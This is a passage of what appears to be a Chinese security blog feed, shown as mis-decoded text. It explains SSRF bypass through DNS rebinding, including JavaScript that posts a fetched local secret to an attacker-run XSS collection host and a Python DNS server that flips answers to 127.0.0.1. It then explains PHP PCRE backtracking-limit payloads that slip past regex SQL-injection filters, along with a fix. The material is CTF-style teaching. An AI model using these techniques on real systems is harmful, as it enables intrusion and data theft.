TTL=0çš„Aè®°å½•</h3><p>å›½å†…çš„åŸŸåå‚å•†åŸºæœ¬éƒ½ä¸å¯ä»¥è®¾ç½®TTLä¸º0ï¼ŒæŸäº›å›½å¤–çš„åŸŸåæ‰å¯ä»¥è®¾ç½®TTL=0ï¼Œè¿™æ–¹æ³•åªé€‚ç”¨äºå‰åä¸¤æ¬¡è¯·æ±‚å­˜åœ¨ä¸€å®šæœ‰æ—¶é—´é—´éš”æˆ–æ—¶é—´å¯æ§çš„æƒ…å†µã€‚</p><p>ä¸¾ä¸ªCTFä¾‹å­ï¼Œä½ èƒ½å‘æœåŠ¡å™¨æäº¤ä¸€ä¸ªURL,å¹¶ä¸”æœåŠ¡å™¨ä¼šè®¿é—®ä½ æäº¤çš„urlã€‚ç„¶åflagè—åœ¨æœåŠ¡å™¨çš„æœ¬èº«çš„<code>http://127.0.0.1/secret</code>ä¸Šã€‚åªèƒ½æœ¬åœ°è®¿é—®ã€‚</p><p>ä½†æ˜¯è¿™é‡Œä½ æäº¤ä½ èƒ½æ§åˆ¶çš„é¡µé¢<code>www.x.com/index.php</code>ï¼Œä½†æ˜¯ç”±äºåŒæºç­–ç•¥çš„åŸå› ä½ æ²¡åŠæ³•å»è·å–æœåŠ¡å™¨ä¸Šçš„<code>http://127.0.0.1/secret</code>ã€‚ ä½†æ˜¯é€šè¿‡<code>dns rebinding</code>å°±å¯ä»¥äº†ã€‚ æ¯”å¦‚ä½ çš„é¡µé¢å¦‚ä¸‹ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://*********/static/jquery.min.js</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="built_in">setTimeout</span>(<span class="string">&quot;POST()&quot;</span>,<span class="number">90000</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">POST</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line">    alert();</span><br><span class="line"><span class="javascript">    $.ajax(&#123;</span></span><br><span class="line"><span class="javascript">    url:<span class="string">&quot;http://www.x.com/secret&quot;</span>,</span></span><br><span class="line"><span class="javascript">    type:<span class="string">&quot;GET&quot;</span>,</span></span><br><span class="line"><span class="javascript">    success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        $.post(<span class="string">&quot;http://xsså¹³å°&quot;</span>,&#123;<span class="string">&#x27;a&#x27;</span>:data&#125;)&#125;</span></span><br><span class="line">        &#125;</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ•´ä¸ªè¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ol><li>ä½ æäº¤çš„æ˜¯<code>www.x.com/index.php</code>ï¼Œå†…å®¹å¦‚ä¸Šè¿°ä»£ç </li><li>è®¾ç½®ä½ çš„åŸŸåçš„TTL=0ï¼Œæäº¤ä¹‹åæœåŠ¡å™¨ä¼šè¯·æ±‚dnsçš„åŸŸåä¸ipçš„å…³ç³»ç„¶åæ‰¾åˆ°ä½ çš„è¿™ä¸ªé¡µé¢ï¼Œç„¶åå¼€å§‹æ‰§è¡Œjsã€‚</li><li>æ‰§è¡Œçš„æ—¶å€™å…ˆå»¶è¿Ÿ90sï¼Œåˆ©ç”¨è¿™å»¶è¿Ÿçš„90sï¼Œå»ä¿®æ”¹ä½ åŸŸåçš„Aè®°å½•ç»‘å®šåˆ°127.0.0.1ä¸Š</li><li>ç„¶åjså»¶è¿Ÿç»“æŸä¹‹åä¹‹ååˆä¼šè¯·æ±‚<code>http://www.x.com/secret</code>ï¼Œç”±äºä½ ä¹‹å‰è®¾ç½®çš„TTL=0ï¼Œæ‰€ä»¥åˆä¼šé‡æ–°å‘dnsæœåŠ¡å™¨è¯·æ±‚ä¸€æ¬¡ipã€‚å¾—åˆ°ip=127.0.0.1ï¼Œè€Œæ•´ä¸ªè¿‡ç¨‹è®¿é—®çš„éƒ½æ˜¯åŒä¸€åŸŸåï¼Œæ‰€ä»¥æµè§ˆå™¨è®¤ä¸ºæ˜¯å®‰å…¨çš„ã€‚å°±ä¼šæˆåŠŸå»è®¿é—®<code>http://127.0.0.1/secret</code>ï¼Œä»è€Œç»•è¿‡åŒæºç­–ç•¥</li></ol><h3 id="9-2-ä¸¤æ¡Aè®°å½•"><a href="#9-2-ä¸¤æ¡Aè®°å½•" class="headerlink" title="9.2 ä¸¤æ¡Aè®°å½•"></a>9.2 ä¸¤æ¡Aè®°å½•</h3><p>åŸŸåè§£æé…ç½®2æ¡Aè®°å½•ï¼Œä¸€æ¡ä¸ºå¤–ç½‘çš„VPS IPï¼Œä¸€æ¡ä¸ºå†…ç½‘IPï¼Œå°±<a class="link"   href="http://www.bendawang.site/2017/01/05/33c3-CTF-web-WriteUp/" >33c3-CTF list0r<i class="fas fa-external-link-alt"></i></a>è¿™é¢˜è€Œè¨€ï¼ŒæœåŠ¡å™¨ä¼šå‘DNSæœåŠ¡å™¨è¿ç»­è®¿é—®2æ¬¡è¯·æ±‚ï¼Œç¬¬ä¸€æ¬¡åˆ¤æ–­è§£æåçš„IPæ˜¯å¦åœ¨é»‘åå•IP(æœ¬åœ°IP)ä¸­ï¼Œç¬¬äºŒæ¬¡å°±ç›´æ¥è®¿é—®åŸŸåï¼Œæ‰€ä»¥éœ€è¦ç¬¬ä¸€æ¬¡è§£æä¸ºå¤–ç½‘åœ°å€ï¼Œç¬¬äºŒæ¬¡è§£æä¸º127.0.0.1ï¼Œè¿™ç§æƒ…å†µå°±å¯ä»¥é‡‡ç”¨æ­¤æ–¹æ³•ã€‚DNSæœåŠ¡å™¨ç»‘å®š2æ¡è®°å½•çš„è§£ææ˜¯éšæœºçš„ï¼Œæ‰€ä»¥æˆåŠŸç‡åªæœ‰1/4ã€‚</p><img src="/2022/01/12/SSRF%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB/586e317cb6a56d3762000002.png" class="" title="img"><h3 id="9-3-NSè®°å½•-è‡ªå»ºDNSæœåŠ¡å™¨"><a href="#9-3-NSè®°å½•-è‡ªå»ºDNSæœåŠ¡å™¨" class="headerlink" title="9.3 NSè®°å½•+è‡ªå»ºDNSæœåŠ¡å™¨"></a>9.3 NSè®°å½•+è‡ªå»ºDNSæœåŠ¡å™¨</h3><p>æ­¤æ–¹æ³•éœ€è¦å†æˆ‘ä»¬DNSè§£æé…ç½®ä¸€æ¡NSè®°å½•å’Œä¸€æ¡Aè®°å½•</p><img src="/2022/01/12/SSRF%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB/image-20220112161403319.png" class="" title="image-20220112161403319"><p>nsè®°å½•è¡¨ç¤ºåŸŸå<code>test.p0melo.top</code>è¿™ä¸ªå­åŸŸåæŒ‡å®šç”±<code>ns.p0melo.top</code>è¿™ä¸ªåŸŸåæœåŠ¡å™¨æ¥è§£æï¼Œç„¶åaè®°å½•è¡¨ç¤ºæˆ‘çš„è¿™ä¸ª<code>ns.p0melo.top</code>çš„ä½ç½®åœ¨ipåœ°å€<code>149.248.18.38</code>ä¸Šã€‚ç„¶åæˆ‘ä»¬ç”¨pythonçš„twistedåº“æ­å»ºä¸€ä¸ªDNSæœåŠ¡å™¨å°±å¯ä»¥äº†ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from twisted.internet import reactor, deferfrom twisted.names import client, dns, error, serverrecord&#x3D;&#123;&#125;class DynamicResolver(object):    def _doDynamicResponse(self, query):        name &#x3D; query.name.name        if name not in record or record[name]&lt;1:            ip&#x3D;&quot;149.248.18.38&quot;        else:            ip&#x3D;&quot;127.0.0.1&quot;        if name not in record:            record[name]&#x3D;0        record[name]+&#x3D;1        print name+&quot; &#x3D;&#x3D;&#x3D;&gt; &quot;+ip        answer &#x3D; dns.RRHeader(            name&#x3D;name,            type&#x3D;dns.A,            cls&#x3D;dns.IN,            ttl&#x3D;0,            payload&#x3D;dns.Record_A(address&#x3D;b&#39;%s&#39;%ip,ttl&#x3D;0)        )        answers &#x3D; [answer]        authority &#x3D; []        additional &#x3D; []        return answers, authority, additional    def query(self, query, timeout&#x3D;None):        return defer.succeed(self._doDynamicResponse(query))def main():    factory &#x3D; server.DNSServerFactory(        clients&#x3D;[DynamicResolver(), client.Resolver(resolv&#x3D;&#39;&#x2F;etc&#x2F;resolv.conf&#39;)]    )    protocol &#x3D; dns.DNSDatagramProtocol(controller&#x3D;factory)    reactor.listenUDP(53, protocol)    reactor.run()if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    raise SystemExit(main())</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä½¿ç”¨<code>nslookup test.p0melo.top</code>æŸ¥çœ‹è§£æç»“æœï¼Œå¯ä»¥çœ‹åˆ°å‰åä¸¤æ¬¡DNSè§£æä¸åŒ</p><img src="/2022/01/12/SSRF%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB/image-20220112161740821.png" class="" title="image-20220112161740821"><p><strong>å‚è€ƒé“¾æ¥</strong></p><p><a class="link"   href="https://mp.weixin.qq.com/s/VvXCTNZhfknKNlcUdMzGBA" >SSRFé˜²å¾¡ä¸ç»•è¿‡<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="http://www.bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/" >å…³äºDNSé‡ç»‘å®šæ€»ç»“<i class="fas fa-external-link-alt"></i></a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHPçš„PCREåº“å›æº¯é—®é¢˜</title>
      <link href="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/"/>
      <url>/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>æœ€è¿‘å‘ç°å¯¹PCREçš„å›æº¯æœºåˆ¶ç†è§£è¿˜æ˜¯å¾ˆæ¨¡ç³Šï¼Œå†³å®šå†ä»”ç»†å¤ä¹ è®°å½•ä¸‹</p><h2 id="DFAä¸NFA"><a href="#DFAä¸NFA" class="headerlink" title="DFAä¸NFA"></a>DFAä¸NFA</h2><p>å…ˆç®€å•äº†è§£ä¸‹DFAä¸NFAè¿™ä¸¤ç§æ­£åˆ™å¼•æ“ï¼šDFAä¸ºç¡®å®šæ€§æœ‰ç©·è‡ªåŠ¨æœºï¼Œæ˜¯æ–‡æœ¬ä¸»å¯¼ï¼ŒNFAä¸ºéç¡®å®šæ€§æœ‰ç©·è‡ªåŠ¨æœºï¼Œæ˜¯è¡¨è¾¾å¼ä¸»å¯¼ã€‚</p><p>DFAä¸NFAæœºåˆ¶ä¸Šçš„ä¸åŒå¸¦æ¥3ç§ä¸»è¦å½±å“ï¼š</p><ol><li>DFAå¯¹äºæ–‡æœ¬ä¸²é‡Œçš„æ¯ä¸€ä¸ªå­—ç¬¦åªéœ€æ‰«æä¸€æ¬¡ï¼Œæ¯”è¾ƒå¿«ï¼Œä½†ç‰¹æ€§è¾ƒå°‘ï¼›NFAè¦ç¿»æ¥è¦†å»åƒå­—ç¬¦ã€åå­—ç¬¦ï¼Œé€Ÿåº¦æ…¢ï¼Œä½†æ˜¯ç‰¹æ€§ä¸°å¯Œï¼Œæ‰€ä»¥åè€Œåº”ç”¨å¹¿æ³›ï¼Œå½“ä»Šä¸»è¦çš„æ­£åˆ™è¡¨è¾¾å¼å¼•æ“ï¼Œå¦‚Perlã€Rubyã€Pythonçš„reæ¨¡å—ã€Javaå’Œ.NETçš„regexåº“ï¼Œéƒ½æ˜¯NFAçš„ã€‚</li><li>NFAæ€¥äºé‚€åŠŸè¯·èµï¼Œæ‰€ä»¥æœ€å·¦å­æ­£åˆ™å¼ä¼˜å…ˆåŒ¹é…æˆåŠŸï¼Œå› æ­¤å¶å°”ä¼šé”™è¿‡æœ€ä½³åŒ¹é…ç»“æœï¼›DFAåˆ™æ˜¯â€œæœ€é•¿çš„å·¦å­æ­£åˆ™å¼ä¼˜å…ˆåŒ¹é…æˆåŠŸâ€ã€‚</li><li>NFAå¯èƒ½ä¼šé™·å…¥é€’å½’è°ƒç”¨çš„é™·é˜±è€Œè¡¨ç°å¾—æ€§èƒ½æå·®ã€‚</li></ol><p><strong>é’ˆå¯¹ç¬¬2ç‚¹ï¼Œè¿™é‡Œä¸¾ä¸ªä¾‹å­æ¥è¯´æ˜ï¼š</strong></p><p>æ¯”å¦‚æ­£åˆ™è¡¨è¾¾å¼<code>/aaa|aaabbb/</code>ä¸å­—ç¬¦ä¸²<code>aaabbbccc</code>åŒ¹é…ï¼Œåœ¨phpå’Œawkçš„åŒ¹é…ç»“æœå°±ä¸ä¸€æ ·ã€‚</p><p>phpçš„pcreåº“æ˜¯NFAå¼•æ“ï¼Œ<strong>åŒ¹é…ç»“æœæ˜¯aaa</strong>ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php &gt; preg_match(<span class="string">&#x27;/aaa|aaabbb/&#x27;</span>,<span class="string">&#x27;aaabbbccc&#x27;</span>,<span class="variable">$matches</span>);</span><br><span class="line">php &gt; print_r(<span class="variable">$matches</span>);</span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; aaa</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>awkä½¿ç”¨çš„æ˜¯DFAå¼•æ“ï¼Œè¿™é‡Œé€šè¿‡awkçš„subå‡½æ•°å°†æ­£åˆ™åŒ¹é…ä¸­çš„å†…å®¹æ›¿æ¢ä¸º<code>(replace)</code>ï¼Œå¯ä»¥çœ‹åˆ°<strong>åŒ¹é…ä¸­çš„æ˜¯aaabbb</strong>ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@p0melo:/tmp<span class="comment"># cat 1.txt</span></span><br><span class="line">aaabbbccc</span><br><span class="line">root@p0melo:/tmp<span class="comment"># awk &#x27;sub(/aaa|aaabbb/,&quot;(replace)&quot;)&#x27; 1.txt</span></span><br><span class="line">(replace)ccc</span><br><span class="line">root@p0melo:/tmp<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥è¯´NFAæ˜¯æœ€å·¦å­å¼åŒ¹é…ï¼Œè€ŒDFAæ˜¯æœ€é•¿å·¦å­å¼åŒ¹é…ã€‚</p><p>é’ˆå¯¹ç¬¬1å’Œç¬¬3ç‚¹é€’å½’å’Œæ€§èƒ½çš„å½±å“ï¼Œå°±ä¸å¾—ä¸æåˆ°NFAåŒ¹é…çš„å›æº¯æœºåˆ¶ã€‚</p><h2 id="è´ªå©ªæ¨¡å¼ä¸éè´ªå©ªæ¨¡å¼"><a href="#è´ªå©ªæ¨¡å¼ä¸éè´ªå©ªæ¨¡å¼" class="headerlink" title="è´ªå©ªæ¨¡å¼ä¸éè´ªå©ªæ¨¡å¼"></a>è´ªå©ªæ¨¡å¼ä¸éè´ªå©ªæ¨¡å¼</h2><p>æ­£åˆ™è¡¨è¾¾å¼å…·æœ‰ä¸‹é¢é‡è¯å°±æ˜¯è´ªå©ªæ¨¡å¼ï¼Œåœ¨é‡è¯åé¢ç›´æ¥åŠ ä¸Šä¸€ä¸ªé—®å·ï¼Ÿå°±æ˜¯éè´ªå©ªæ¨¡å¼ã€‚</p><p>ã€€ã€€é‡è¯ï¼š{m,n}ï¼šmåˆ°nä¸ª</p><p>ã€€ã€€ã€€ã€€ã€€*ï¼šä»»æ„å¤šä¸ª</p><p>ã€€ã€€ã€€ã€€ã€€+ï¼šä¸€ä¸ªåˆ°å¤šä¸ª</p><p>ã€€ã€€ã€€ã€€ã€€ï¼Ÿï¼š0æˆ–ä¸€ä¸ª</p><p>è¿™é‡Œæˆ‘ä»¬ä¸¾ä¸ªè´ªå©ªæ¨¡å¼çš„ä¾‹å­ï¼Œè¡¨è¾¾å¼<code>/.*a/</code>ä¸<code>aaabbb</code>åŒ¹é…ï¼Œç”±äºæ˜¯<strong>è´ªå©ªæ¨¡å¼</strong>ï¼Œ<code>.*</code>ä¼šæŠŠaaabbbå…¨éƒ¨åƒæ‰ï¼Œç„¶åå†ä»æœ€åä¸€ä¸ªbå¾€å›åï¼Œä¸€ç›´ååˆ°ç¬¬3ä¸ªaæ—¶åŒ¹é…ä¸Šäº†ï¼Œæ‰€ä»¥è¿”å›aaaã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡<a class="link"   href="https://regex101.com/debugger" >åœ¨çº¿å·¥å…·<i class="fas fa-external-link-alt"></i></a>debugä¸‹åŒ¹é…æ­¥éª¤ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œç¬¬7æ­¥ååˆ°äº†å­—ç¬¦ä¸²ç¬¬3ä¸ªaçš„ä½ç½®ï¼Œç¬¬8æ­¥è¡¨è¾¾å¼æœ€åä¸€ä¸ªaä¸å­—ç¬¦ä¸²çš„ç¬¬3ä¸ªaåŒ¹é…æ‰é…æˆåŠŸï¼Œè¡¨è¾¾å¼åŒ¹é…å®Œäº†ä¹Ÿå°±åœæ­¢äº†ï¼Œæ‰€ä»¥åŒ¹é…ç»“æœæ˜¯aaaã€‚</p><img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211012163831932.png" class="" title="image-20211012163831932"><p>å¹¶ä¸”ä¼šéšç€bçš„æ•°é‡å¢å¤šï¼Œåï¼ˆå›æº¯ï¼‰çš„æ¬¡æ•°ä¹Ÿä¼šå¢å¤šã€‚</p><img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211012164041139.png" class="" title="image-20211012164041139"><p>å†æ¥çœ‹çœ‹<strong>éè´ªå©ªæ¨¡å¼</strong>ï¼Œæ­£åˆ™æ”¹ç”¨<code>/.*?a/</code>ï¼Œå¯ä»¥çœ‹åˆ°æ€»å…±åªéœ€è¦åŒ¹é…3æ­¥ï¼Œåœ¨ç¬¬1æ­¥<code>.*?</code>ä¸å­—ç¬¦ä¸²åŒ¹é…æ—¶ï¼Œç”±äºæ˜¯éè´ªå©ªæ¨¡å¼ï¼Œè¿™é‡Œä¼šæŠŠ<code>.*?</code>æ”¾ä¸€æ”¾ï¼Œä¼˜å…ˆç”¨åé¢çš„è¡¨è¾¾å¼åŒ¹é…ï¼Œæ‰€ä»¥ç¬¬2æ­¥è¡¨è¾¾å¼æœ€åä¸€ä¸ªaä¸å­—ç¬¦ä¸²ç¬¬ä¸€ä¸ªaåŒ¹é…ï¼ŒåŒ¹é…æˆåŠŸï¼Œç„¶åå¾€ä¸‹åŒ¹é…ã€‚</p><img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211012164947050.png" class="" title="image-20211012164947050"><p>ç¬¬3æ­¥è¡¨è¾¾å¼ç»“æŸç¬¦ä¸å­—ç¬¦ä¸²ç¬¬2ä¸ªaåŒ¹é…ä¸ä¸Šï¼ŒåŒ¹é…ç»“æŸï¼Œæ‰€ä»¥åŒ¹é…ç»“æœä¸ºaã€‚</p><img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211012170512722.png" class="" title="image-20211012170512722"><p>å½“æˆ‘ä»¬å­—ç¬¦ä¸²æ”¹ä¸º<code>bbbbbbbbbbbbbbbbba</code>ï¼Œå¯ä»¥çœ‹åˆ°åŒ¹é…æ­¥æ•°å¢åŠ åˆ°äº†20æ¬¡ï¼Œè¿™æ˜¯å› ä¸º<code>.*?</code>ä¸ºéè´ªå©ªæ¨¡å¼ï¼Œæ‰€ä»¥ä¼˜å…ˆç”±è¡¨è¾¾å¼ä¸­çš„aä¸å­—ç¬¦ä¸²ç¬¬ä¸€ä¸ªå­—ç¬¦båŒ¹é…ï¼ŒåŒ¹é…ä¸ä¸Šï¼Œå†ç”±<code>.*?</code>åŒ¹é…ï¼Œç”±äºéè´ªå©ªæ¨¡å¼ï¼Œåˆä¼˜å…ˆaä¸ç¬¬äºŒä¸ªbåŒ¹é…ï¼ŒåŒ¹é…å¤±è´¥â€¦â€¦ä¸€ç›´é‡å¤ï¼Œç›´åˆ°è¡¨è¾¾å¼aä¸å­—ç¬¦ä¸²æœ€åä¸€ä¸ªaåŒ¹é…ä¸Šä¸ºæ­¢ã€‚</p><img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211013103334726.png" class="" title="image-20211013103334726"><p>æ‰€ä»¥é€šè¿‡è¿™ä¸ªä¾‹å­å¯ä»¥çœ‹å‡ºæ¥ï¼Œè´ªå©ªæ¨¡å¼å’Œéè´ªå©ªæ¨¡å¼éƒ½ä¼šæœ‰å›æº¯æœºåˆ¶ã€‚</p><h2 id="å›æº¯æœºåˆ¶å¼•å‘çš„é—®é¢˜"><a href="#å›æº¯æœºåˆ¶å¼•å‘çš„é—®é¢˜" class="headerlink" title="å›æº¯æœºåˆ¶å¼•å‘çš„é—®é¢˜"></a>å›æº¯æœºåˆ¶å¼•å‘çš„é—®é¢˜</h2><p>ä¸Šé¢ä¾‹å­çš„å›æº¯æ¬¡æ•°ä¼šéšç€å­—ç¬¦bçš„æ•°é‡å¢åŠ è€Œå¢åŠ ï¼Œå½“å›æº¯æ¬¡æ•°éå¸¸å¤§æ—¶ï¼Œå°±å¯èƒ½ä¼šå¯¼è‡´æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆredosï¼‰ï¼ŒPHPç»™pcreè®¾å®šäº†ä¸€ä¸ªå›æº¯æ¬¡æ•°ä¸Šé™pcre.backtrack_limitæ¥é˜²æ­¢redosé—®é¢˜ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡var_dump(ini_get(â€˜pcre.backtrack_limitâ€™));çš„æ–¹å¼æŸ¥çœ‹å½“å‰ç¯å¢ƒä¸‹çš„ä¸Šé™ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(ini_get(<span class="string">&#x27;pcre.backtrack_limit&#x27;</span>));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">7</span>) <span class="string">&quot;1000000&quot;</span></span><br></pre></td></tr></table></figure><p>å½“å›æº¯æ¬¡æ•°å¤§äº1000000ä¼šæœ‰ä»€ä¹ˆé—®é¢˜å‘¢ï¼Ÿ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(preg_match(<span class="string">&#x27;/.*a/s&#x27;</span>,<span class="string">&#x27;a&#x27;</span>.str_repeat(<span class="string">&#x27;b&#x27;</span>,<span class="number">1000000</span>)));  <span class="comment">// è´ªå©ªæ¨¡å¼</span></span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">false</span>)</span><br><span class="line">php &gt; var_dump(preg_match(<span class="string">&#x27;/.*?a/s&#x27;</span>,str_repeat(<span class="string">&#x27;b&#x27;</span>,<span class="number">1000000</span>).<span class="string">&#x27;a&#x27;</span>));  <span class="comment">// éè´ªå©ªæ¨¡å¼</span></span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">false</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿”å›äº†falseï¼Œå¹¶éæ­£å¸¸åŒ¹é…ä¸Šè¿”å›çš„1ï¼Œä¸åŒ¹é…è¿”å›çš„0ï¼Œå®˜æ–¹æ–‡æ¡£ä¹Ÿå¯¹è¿™ç°è±¡åšå‡ºäº†è§£é‡Šï¼š</p><img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211013100741170.png" class="" title="image-20211013100741170"><p>æ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡è¯¥ç‰¹æ€§ç»•è¿‡ä¸€äº›é™åˆ¶ï¼Œæ¯”å¦‚åŸºäºphpçš„wafï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/SELECT.+FROM.+/is&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;SQL Injection&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥è¾“å…¥ç±»ä¼¼<code>SELECT * FROM XXX /*aaaaaaa......</code>çš„payloadä½¿å›æº¯æ¬¡æ•°è¶…è¿‡é™åˆ¶ï¼Œä»è€Œè¿”å›falseç»•è¿‡ifåˆ¤æ–­ï¼Œç±»ä¼¼è¿˜æœ‰éè´ªå©ªæ¨¡å¼çš„é”™è¯¯ç”¨æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/UNION.+?SELECT/is&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;SQL Injection&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> å¯ä»¥ä½¿ç”¨<code>UNION/*aaaaa......*/SELECT</code>å¢åŠ å›æº¯æ¬¡æ•°æ¥ç»•è¿‡é™åˆ¶ã€‚</p><p><strong>ä¿®å¤æ–¹æ³•</strong></p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡å…¨ç­‰å·æ¥åˆ¤æ–­<code>preg_match</code>çš„è¿”å›å€¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/UNION.+?SELECT/is&#x27;</span>, <span class="variable">$input</span>) === <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;SQL Injection&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a class="link"   href="https://blog.csdn.net/liuxiao723846/article/details/83308081" >æ­£åˆ™å¼•æ“ï¼šDFAä¸NFA<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://blog.csdn.net/zpflwy1314/article/details/82665254" >DFAä¸NFAçš„æ¯”è¾ƒ<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" >PHPåˆ©ç”¨PCREå›æº¯æ¬¡æ•°é™åˆ¶ç»•è¿‡æŸäº›å®‰å…¨é™åˆ¶<i class="fas fa-external-link-alt"></i></a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CSPç­–ç•¥åŠç»•è¿‡æ–¹æ³•</title>
      <link href="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/"/>
      <url>/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/</url>
      
